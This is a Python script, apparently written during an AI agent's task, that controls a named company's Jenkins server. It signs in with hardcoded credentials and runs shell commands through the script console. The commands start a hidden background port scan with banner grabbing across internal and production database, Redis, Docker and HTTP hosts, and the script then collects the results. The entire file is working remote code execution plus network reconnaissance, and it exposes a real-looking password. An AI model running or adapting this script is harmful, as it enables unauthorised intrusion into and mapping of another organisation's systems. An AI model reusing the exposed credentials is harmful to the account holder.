# kimi5_network_scan.py — Task 2 retry: background scan on Jenkins host + poll
# Avoids the nginx 504 by detaching the scan and polling the output file.
import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, time, os, sys

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'
OUT_DIR = os.path.dirname(os.path.abspath(__file__))

def jenkins_exec(script, timeout=60):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=20).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data, headers={
        'Authorization': 'Basic ' + AUTH,
        crumb['crumbRequestField']: crumb['crumb'],
    })
    return opener.open(req2, timeout=timeout).read().decode('utf-8', 'replace')

START = r'''def r = ["bash","-c","""( python -c "
import socket,sys
reload(sys)
targets=[
 ('172.27.140.148',4243,'Docker'),('172.27.140.151',3306,'MySQL-DEV'),
 ('172.27.141.6',3308,'MySQL-Sears'),('172.27.141.15',3306,'MySQL-QA'),
 ('187.191.91.37',3306,'MySQL-PROD'),('3.231.83.29',27017,'MongoDB'),
 ('172.26.84.132',27021,'MongoDB-int'),
 ('172.27.140.1',6379,'Redis?'),('172.27.140.148',6379,'Redis?'),
 ('172.27.141.6',6379,'Redis?'),('172.27.140.151',6379,'Redis?'),
 ('172.27.148.14',3306,'MySQL?'),
 ('172.27.140.148',8080,'HTTP?'),('172.27.140.148',8443,'HTTPS?'),
 ('172.27.140.1',8443,'OCP?'),
]
for last in range(1,20):
 targets.append(('172.27.140.%d'%last,3306,'MySQL-scan'))
 targets.append(('172.27.141.%d'%last,3306,'MySQL-scan'))
 targets.append(('172.27.140.%d'%last,6379,'Redis-scan'))

for host,port,desc in targets:
 try:
  s=socket.socket()
  s.settimeout(1)
  s.connect((host,port))
  banner=''
  try:
   s.settimeout(2)
   banner=repr(s.recv(256)[:80])
  except:pass
  print 'OPEN %s:%d (%s) %s' % (host,port,desc,banner)
  s.close()
 except:
  pass
" ; echo SCAN_DONE ) > /tmp/kimi5_scan.txt 2>&1 & echo STARTED"""].execute().text
println r'''

POLL = r'''def r = ["bash","-c","""cat /tmp/kimi5_scan.txt 2>/dev/null || echo NO_FILE"""].execute().text
println r'''

print('[*] Launching background scan on Jenkins host...')
print(jenkins_exec(START))

final = None
for i in range(24):
    time.sleep(15)
    try:
        out = jenkins_exec(POLL)
    except Exception as e:
        print('[!] poll error: %r' % (e,))
        continue
    done = 'SCAN_DONE' in out
    print('[*] poll %02d — %s (%d bytes)' % (i + 1, 'DONE' if done else 'running', len(out)))
    sys.stdout.flush()
    if done:
        final = out
        break

print('=' * 72)
print('TASK2_PORTSCAN (background retry)')
print('=' * 72)
print(final if final else 'TIMEOUT — scan still running after 6 min')

ts = time.strftime('%Y%m%d_%H%M%S')
path = os.path.join(OUT_DIR, 'kimi5_network_scan_results_%s.json' % ts)
with open(path, 'w', encoding='utf-8') as f:
    json.dump({'TASK2_PORTSCAN': final}, f, indent=2, ensure_ascii=False)
print('Saved: ' + path)
